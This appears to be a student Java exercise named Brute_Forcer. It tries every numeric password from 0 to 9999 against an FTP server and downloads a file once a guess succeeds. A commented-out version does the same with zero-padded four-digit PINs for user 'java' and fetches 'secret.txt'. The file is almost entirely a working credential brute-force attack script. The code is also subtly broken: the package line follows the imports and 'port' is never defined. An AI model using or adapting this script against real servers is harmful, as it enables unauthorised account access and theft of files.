import java.io.File;

import it.sauronsoftware.ftp4j.FTPClient;


package exam;

public class Brute_Forcer {

	public static void main(String[] args) throws Exception{

		int[]arr=new int[4];

		FTPClient client = new FTPClient();

		client.connect("ip주소", port);

		for(int i=0;i<10000;i++) {
			try {
				client.login("id", String.valueOf(i));//1000~9999
				client.download("파일명.txt", new File("d:/다운로드폴더/파일명.txt"));
				break;	
			}catch(Exception e) {
				System.out.println("패스워드 오류: "+i);
			}
		}
		//String.valueOf(i) or i+"" ->int형인 i를 String형으로 변환
		client.disconnect(true); //접속연결끊기
	}



}



//String pwd;
//for(int i=0;i<10;i++) {
//		for(int m=0;m<10;m++) {
//			for(int n=0;n<10;n++) {
//				for(int b=0;b<10;b++) {
//					pwd=i+""+m+""+n+""+b;
//					try {
//						client.login("java", pwd);
//						client.download("secret.txt", new File("d:/다운로드폴더/secret.txt"));
//						break;	
//					}catch(Exception e) {
//						System.out.println("패스워드 오류: "+pwd);
//					}
//				}
//			}
//		}
//}


